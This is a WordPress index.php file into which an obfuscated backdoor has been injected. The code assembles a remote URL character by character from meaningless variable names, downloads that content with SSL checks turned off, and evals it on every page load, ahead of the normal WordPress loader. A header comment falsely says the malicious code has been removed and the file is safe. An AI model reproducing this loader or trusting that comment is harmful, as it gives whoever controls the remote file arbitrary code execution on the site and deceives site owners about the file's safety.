<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$qwertylkjhgf = 'h'; $mnbvcxzasdfg = 't'; $poiuytrewqlk = 't'; $zxcvbnmlkjhg = 'p'; $asdfghjklqwe = 's';
$tyuiopasdfgh = ':'; $lkjhgfdsazxc = '/'; $qazwsxedcrfv = '/'; $tgbyhnujmikl = 'r'; $plokimjnuhby = 'a';
$wsxcderfvbgt = 'w'; $mkijnuhbygvt = '.'; $cdesxwaqzfrd = 'g'; $vfrtgbyhnujm = 'i'; $yhnujmikolpl = 't';
$bgtyhnujmiko = 'h'; $aqwsdefrgtbh = 'u'; $mkoijnuhbygv = 'b'; $zaqxswcdevfr = 'u'; $gtbyhnumkilo = 's';
$plmkoijnuhby = 'e'; $vcdexswzaqrf = 'r'; $bgtyhnjumkil = 'c'; $wsxcdefrvgbt = 'o'; $njikolpmwsxc = 'n';
$uhbygtvfrced = 't'; $lkmijnuhbygv = 'e'; $pqowieurytla = 'n'; $zxswqacdevfr = 't'; $mkloijnuhbyg = '.';
$qpwoeirutysl = 'c'; $mnbhgvcfxdre = 'o'; $lkajhsgdfqwe = 'm'; $pqazwsxedcrf = '/'; $kmijnuhbvgyt = 's';
$plqowieurytl = 'e'; $aqzsxwdcevfr = 'o'; $mkoilpjnuhby = 'b'; $zaqswxcderfv = 'e'; $plmnkoijhuyb = 'l';
$wsxaqzcdevfr = 'a'; $gtfrvcdexswz = '/'; $bhygtfrvcdes = 'b'; $njukilomwsxc = 'e'; $plokjmnuhbyg = 'l';
$wsaqzxcderfv = 'a'; $mkoijnbhgvft = '/'; $plqazwsxedcr = 'r'; $bgtyhnujmkol = 'e'; $wsxcdevfrbgt = 'f';
$nhygtfrvcdes = 's'; $plokmnjiuhby = '/'; $qazxswedcrfv = 'h'; $mnjukiloplmk = 'e'; $bgtyhnumjiko = 'a';
$plwsxcdevfrt = 'd'; $qazxswedcvfr = 's'; $mkoilpnhbygt = '/'; $plqoweirtyla = 'm'; $zxswaqcderfv = 'a';
$mkoijnbhygtf = 'i'; $plwsxqazcdve = 'n'; $zaqxswcdvfre = '/'; $plmkoijnbhuy = 'i'; $wsxaqzcderfv = 'n';
$mkoiplnhbgyt = 'd'; $plqazwsxcdev = 'e'; $wsxaqzcdvfre = 'x'; $plmkoilpnhby = '.'; $zaqxswcdevfr = 't';
$mkoijnuhbgyt = 'x'; $plwsxaqzcdve = 't';

$full_url = $qwertylkjhgf.$mnbvcxzasdfg.$poiuytrewqlk.$zxcvbnmlkjhg.$asdfghjklqwe.$tyuiopasdfgh.$lkjhgfdsazxc.$qazwsxedcrfv.$tgbyhnujmikl.$plokimjnuhby.$wsxcderfvbgt.$mkijnuhbygvt.$cdesxwaqzfrd.$vfrtgbyhnujm.$yhnujmikolpl.$bgtyhnujmiko.$aqwsdefrgtbh.$mkoijnuhbygv.$zaqxswcdevfr.$gtbyhnumkilo.$plmkoijnuhby.$vcdexswzaqrf.$bgtyhnjumkil.$wsxcdefrvgbt.$njikolpmwsxc.$uhbygtvfrced.$lkmijnuhbygv.$pqowieurytla.$zxswqacdevfr.$mkloijnuhbyg.$qpwoeirutysl.$mnbhgvcfxdre.$lkajhsgdfqwe.$pqazwsxedcrf.$kmijnuhbvgyt.$plqowieurytl.$aqzsxwdcevfr.$mkoilpjnuhby.$zaqswxcderfv.$plmnkoijhuyb.$wsxaqzcdevfr.$gtfrvcdexswz.$bhygtfrvcdes.$njukilomwsxc.$plokjmnuhbyg.$wsaqzxcderfv.$mkoijnbhgvft.$plqazwsxedcr.$bgtyhnujmkol.$wsxcdevfrbgt.$nhygtfrvcdes.$plokmnjiuhby.$qazxswedcrfv.$mnjukiloplmk.$bgtyhnumjiko.$plwsxcdevfrt.$qazxswedcvfr.$mkoilpnhbygt.$plqoweirtyla.$zxswaqcderfv.$mkoijnbhygtf.$plwsxqazcdve.$zaqxswcdvfre.$plmkoijnbhuy.$wsxaqzcderfv.$mkoiplnhbgyt.$plqazwsxcdev.$wsxaqzcdvfre.$plmkoilpnhby.$zaqxswcdevfr.$mkoijnuhbgyt.$plwsxaqzcdve;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
